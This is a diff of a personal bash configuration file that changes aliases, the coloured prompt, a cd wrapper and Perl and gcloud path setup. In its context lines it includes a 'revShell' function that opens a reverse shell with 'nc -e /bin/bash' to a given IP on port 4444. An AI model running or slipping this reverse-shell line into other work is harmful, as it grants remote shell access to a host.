@@ -91,9 +91,9 @@ alias hlp='less ~/.bashrc_help'
 alias da='date "+%Y-%m-%d %A %T %Z"'
 
 # Alias's to modified commands
-alias cp='cp -i'
-alias mv='mv -i'
-alias rm='rm -iv'
+alias cp='cp -iv'
+alias mv='mv -iv'
+#alias rm='rm -iv'
 alias rt='trash'
 
 alias mkdir='mkdir -p'
@@ -422,7 +422,7 @@ cpp()
 		fi
 
 		# CPU
-		PS1="\[${LIGHTMAGENTA} $LAST_COMMAND\] \[${MAGENTA}\](CPU \[${LIGHTBLUE}\]$(cpu)\[${GREEN}\]%\[${MAGENTA}\])\[${YELLOW}\]-"
+		PS1="\[${LIGHTMAGENTA}$LAST_COMMAND\] \[${MAGENTA}\](\[${LIGHTBLUE}\]$(cpu)\[${GREEN}\]%\[${MAGENTA}\])\[${YELLOW}\]"
 
 		# User and server
         local SSH_IP=$(echo "$SSH_CLIENT" | awk '{ print $1 }')
@@ -434,10 +434,10 @@ cpp()
 		fi
 
 		# Current directory
-		PS1+="\[${DARKGRAY}\]:\[${BROWN}\]\w\[${DARKGRAY}\]\[${WHITE}\])\[${LIGHTGREEN}\]-"
+		PS1+="\[${GREEN}\]:\[${BROWN}\]\w\[${DARKGRAY}\]\[${WHITE}\])\[${LIGHTGREEN}\]-"
 
 		if [[ $EUID -ne 0 ]]; then
-			PS1+="\[${LIGHTCYAN}\]>\[${NOCOLOR}\] " # Normal user
+			PS1+="\[${LIGHTCYAN}\]>\[${NOCOLOR}\]" # Normal user
 		else
 			PS1+="\[${RED}\]#\[${NOCOLOR}\] " # Root user
 		fi
@@ -484,11 +484,15 @@ alias myip="/home/f4lc0n/Scripts/Shell/ipAddr.sh"
 # gem install colorls
 function cd()
 {
-	builtin cd $1
+    if [ "$1" == "" ]
+    then 
+        builtin cd ~
+    fi
+	builtin cd "$1"
     if [ $? -eq 0 ];then
     #if builtin cd "$1"
     #then
-		lc .
+		ls .
 	fi
 }
 
@@ -511,3 +515,22 @@ function revShell
     nc -e  /bin/bash "$ip" 4444
     echo "Stareted Shell on port 4444. Use nc -lvp 4444 to capture it."
 }
+
+PATH="/home/f4lc0n/perl5/bin${PATH:+:${PATH}}"; export PATH;
+PERL5LIB="/home/f4lc0n/perl5/lib/perl5${PERL5LIB:+:${PERL5LIB}}:.:"; export PERL5LIB;
+PERL_LOCAL_LIB_ROOT="/home/f4lc0n/perl5${PERL_LOCAL_LIB_ROOT:+:${PERL_LOCAL_LIB_ROOT}}"; export PERL_LOCAL_LIB_ROOT;
+PERL_MB_OPT="--install_base \"/home/f4lc0n/perl5\""; export PERL_MB_OPT;
+PERL_MM_OPT="INSTALL_BASE=/home/f4lc0n/perl5"; export PERL_MM_OPT;
+
+# The next line updates PATH for the Google Cloud SDK.
+if [ -f '/usr/local/share/google-cloud-sdk/path.bash.inc' ]; then source '/usr/local/share/google-cloud-sdk/path.bash.inc'; fi
+
+# The next line enables shell command completion for gcloud.
+if [ -f '/usr/local/share/google-cloud-sdk/completion.bash.inc' ]; then source '/usr/local/share/google-cloud-sdk/completion.bash.inc'; fi
+
+
+alias top='htop'
+
+
+# Bash Bookmarks -- https://github.com/huyng/bashmarks
+source ~/.local/bin/bashmarks.sh
